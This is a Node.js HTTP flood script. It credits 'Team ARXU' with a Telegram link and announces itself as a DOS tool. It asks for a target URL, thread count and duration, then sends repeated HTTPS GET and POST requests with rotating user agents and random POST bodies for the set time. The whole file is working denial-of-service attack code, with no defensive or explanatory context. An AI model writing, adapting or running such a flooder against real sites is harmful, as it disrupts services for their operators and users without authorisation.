//Team ARXU. Link: https://t.me/teamARXU

const https = require('https');
const fs = require('fs');
const readline = require('readline');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

let targetUrl = '';
let numThreads = 100; 
let userAgentList = [];
let attackDuration = 60; 

const loadUserAgents = () => {
    try {
        const data = fs.readFileSync('ua.txt', 'utf8');
        userAgentList = data.split('\n');
    } catch (err) {
        console.error('Error reading user agent file:', err);
        process.exit(1);
    }
};

const getRandomUserAgent = () => {
    return userAgentList[Math.floor(Math.random() * userAgentList.length)];
};

const attack = () => {
    const userAgent = getRandomUserAgent();
    const headers = {
        'User-Agent': userAgent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0'
    };

    const options = {
        method: 'GET',
        headers: headers
    };

    https.get(targetUrl, options, (res) => {
        res.on('data', () => {});
        res.on('end', () => {});
    }).on('error', (err) => {});
};

const attackSky = (target, thread, duration) => {
    const getRandomInt = (min, max) => {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    };

    const attack = () => {
        const requestMethod = Math.random() < 0.5 ? 'GET' : 'POST';
        const userAgent = getRandomUserAgent();
        const headers = {
            'User-Agent': userAgent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        };

        let postData = '';

        if (requestMethod === 'POST') {
            const dataLength = getRandomInt(10, 100);
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            for (let i = 0; i < dataLength; i++) {
                postData += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            headers['Content-Type'] = 'application/x-www-form-urlencoded';
            headers['Content-Length'] = Buffer.byteLength(postData);
        }

        const options = {
            method: requestMethod,
            headers: headers
        };

        const req = https.request(target, options, (res) => {
            res.on('data', () => {});
            res.on('end', () => {});
        });

        req.on('error', (err) => {});

        if (requestMethod === 'POST') {
            req.write(postData);
        }

        req.end();
    };

    for (let i = 0; i < thread; i++) {
        setInterval(attack, Math.floor(Math.random() * 1000));
    }

    setTimeout(() => {
        console.log('Attack duration ended.');
        process.exit(0);
    }, duration * 1000);
};

const countdown = () => {
    let timeLeft = attackDuration;
    const timer = setInterval(() => {
        if (timeLeft <= 0) {
            clearInterval(timer);
            console.log('Attack duration ended.');
        } else {
            console.log(`Time left: ${timeLeft} seconds`);
            timeLeft--;
        }
    }, 1000);
};

rl.question('Enter Target URL: ', (answer) => {
    targetUrl = answer;
    rl.question('Enter Number of Threads (default is 100): ', (answer) => {
        numThreads = parseInt(answer) || numThreads;
        rl.question('Enter Attack Duration in Seconds (default is 60): ', (answer) => {
            attackDuration = parseInt(answer) || attackDuration;
            loadUserAgents();

            console.log(`Attacking at ${targetUrl} with ${numThreads} threads for ${attackDuration} seconds by Team ARXU's DOS tool...`);

            for (let i = 0; i < numThreads; i++) {
                attack();
            }

            attackSky(targetUrl, numThreads, attackDuration);

            countdown();

            rl.close();
        });
    });
});
